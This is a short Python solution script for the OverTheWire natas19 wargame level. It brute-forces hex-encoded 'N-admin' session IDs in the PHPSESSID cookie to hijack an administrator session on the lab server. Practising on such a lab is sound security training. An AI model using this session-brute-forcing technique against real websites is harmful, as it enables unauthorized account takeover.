#!/bin/python
import requests
import string

url = "http://natas19.natas.labs.overthewire.org/index.php"
username = "natas19"
password = '' # password for natas18 goes here
suffix = '-admin'

for i in range(0,641):
	sess = str(i) + suffix
	print("Trying id " + sess)
	s = requests.Session()
	s.auth = (username, password)

	sesshex = sess.encode('ascii').hex()
	print("hex value is " + str(sesshex))
	r = s.get(url, cookies={'PHPSESSID': str(sesshex)})
	hint = 'regular user'
	if not hint in r.text:
		print(r.text)